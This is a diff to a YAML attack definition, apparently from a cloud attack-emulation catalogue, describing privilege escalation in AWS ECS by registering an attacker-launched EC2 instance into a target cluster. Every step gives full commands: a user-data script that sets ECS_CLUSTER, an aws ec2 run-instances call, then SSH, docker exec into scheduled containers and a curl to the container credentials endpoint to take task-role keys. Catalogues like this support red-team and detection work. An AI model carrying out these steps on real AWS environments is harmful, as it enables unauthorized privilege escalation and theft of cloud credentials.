@@ -1,10 +1,22 @@
 attack:
-  id: AWS-ECS-001
-  name: Privilege Escalation via ECS Cluster Registration
+  id: aws-ecs-privesc-via-ec2-registration
+  name: ECS Privilege Escalation via EC2 Instance Registration
   overview: |
-    This attack leverages EC2 and ECS permissions to achieve privilege escalation by creating a malicious EC2 instance and registering it within an existing ECS cluster. Once registered, ECS services and tasks are scheduled to run on the attacker-controlled EC2 instance as Docker containers. The attacker can then access these containers, extract their IAM role credentials from the instance metadata service, and assume more privileged ECS task roles to escalate privileges within the AWS environment.
+    This attack exploits EC2 and ECS permissions to achieve privilege escalation by creating a malicious EC2 instance and registering it to an existing ECS cluster. The attacker launches an EC2 instance with an IAM instance profile that has ECS access, configures it to join a target ECS cluster, and waits for ECS services to schedule containers on the compromised instance. Once containers are running on the attacker-controlled EC2 instance, the attacker can access the Docker runtime, penetrate the containers, and extract the IAM credentials associated with ECS task roles, which typically have elevated permissions for application workloads.
   steps:
-    - title: Create Malicious EC2 Instance with ECS Configuration
+    - title: Create User Data Script for ECS Cluster Registration
+      command: |
+        cat > /tmp/asd.sh << 'EOF'
+        #!/bin/bash
+        echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
+        EOF
+      dependencies:
+        - Local file system access to create user data script
+        - Knowledge of target ECS cluster name
+      result: |
+        A user data script is created that will configure the EC2 instance to automatically register with the target ECS cluster upon launch by modifying the ECS agent configuration.
+      ttp: T1059.004 - Command and Scripting Interpreter: Unix Shell
+    - title: Launch EC2 Instance with ECS Configuration
       command: |
         aws ec2 run-instances \
             --image-id ami-07fde2ae86109a2af \
@@ -12,34 +24,17 @@ attack:
             --iam-instance-profile <ECS_role> \
             --count 1 --key-name pwned \
             --user-data "file:///tmp/asd.sh"
-        
-        # User data script content (/tmp/asd.sh):
-        #!/bin/bash
-        echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
       dependencies:
         - ec2:RunInstances permission
         - iam:PassRole permission for the ECS instance profile
-        - Valid SSH key pair (pwned) in the target region
-        - ECS-optimized AMI (amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
-        - IAM instance profile with basic ECS access permissions
-        - Knowledge of target ECS cluster name
+        - Valid ECS-optimized AMI ID (e.g., amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
+        - Existing IAM instance profile with basic ECS permissions (ecs:RegisterContainerInstance, ecs:DeregisterContainerInstance, ecs:DiscoverPollEndpoint, ecs:Submit*)
+        - Existing SSH key pair for instance access
+        - Network access to target ECS cluster
       result: |
-        A new EC2 instance is launched with the ECS agent pre-configured to register with the target ECS cluster. The instance uses an IAM instance profile that grants it permissions to communicate with ECS services. The user data script automatically configures the instance to join the specified cluster upon boot, making it available to receive ECS task deployments.
-      ttp: T1078.004 - Valid Accounts: Cloud Accounts
-    - title: Register EC2 Instance to Target ECS Cluster
-      command: |
-        # Automatic registration occurs via ECS agent on boot
-        # Verify registration:
-        aws ecs list-container-instances --cluster <cluster-name>
-      dependencies:
-        - EC2 instance successfully launched from Step 1
-        - ECS agent running on the instance
-        - Network connectivity between EC2 instance and ECS service endpoints
-        - IAM instance profile with ecs:RegisterContainerInstance permission
-      result: |
-        The malicious EC2 instance successfully registers as a container instance within the target ECS cluster. The ECS scheduler now considers this instance as a valid host for deploying tasks and services. The attacker gains visibility into which containers and services are scheduled on their controlled instance.
-      ttp: T1525 - Implant Internal Image
-    - title: Extract ECS Task Role Credentials from Running Containers
+        An EC2 instance is launched and automatically registers as a container instance within the target ECS cluster. The ECS scheduler may begin placing tasks and services on this compromised instance.
+      ttp: T1578.002 - Create Cloud Instance
+    - title: Access Containers and Extract ECS Task Role Credentials
       command: |
         # SSH into the compromised EC2 instance
         ssh -i pwned.pem ec2-user@<instance-ip>
@@ -47,21 +42,16 @@ attack:
         # List running containers
         docker ps
         
-        # Access container and extract credentials
-        docker exec -it <container-id> /bin/bash
-        
-        # Retrieve task role credentials from metadata service
+        # Access container and extract credentials from metadata service
+        docker exec -it <container-id> /bin/sh
         curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
-        
-        # Or from the host:
-        curl http://169.254.170.2/v2/credentials/<task-role-guid>
       dependencies:
-        - SSH access to the compromised EC2 instance
-        - ECS tasks/services scheduled on the attacker-controlled instance
-        - Docker access on the EC2 instance
-        - Network access to ECS task metadata endpoint (169.254.170.2)
+        - SSH access to the launched EC2 instance
+        - ECS tasks/services scheduled on the compromised instance
+        - Docker runtime access on the EC2 instance
+        - Network connectivity to AWS metadata service from container
       result: |
-        The attacker successfully extracts temporary security credentials (AccessKeyId, SecretAccessKey, SessionToken) associated with the IAM roles attached to ECS tasks running on their controlled instance. These credentials typically have elevated permissions for accessing AWS services like S3, DynamoDB, RDS, or other resources that the legitimate application requires. The attacker can now use these credentials to access sensitive data, modify resources, or further escalate privileges within the AWS environment.
+        The attacker gains access to IAM credentials associated with ECS task roles running on the compromised instance. These credentials typically have elevated permissions for accessing AWS services like S3, DynamoDB, RDS, or other application resources, achieving privilege escalation beyond the attacker's original permissions.
       ttp: T1552.005 - Unsecured Credentials: Cloud Instance Metadata API
   stride_goal:
     - Elevation of Privilege
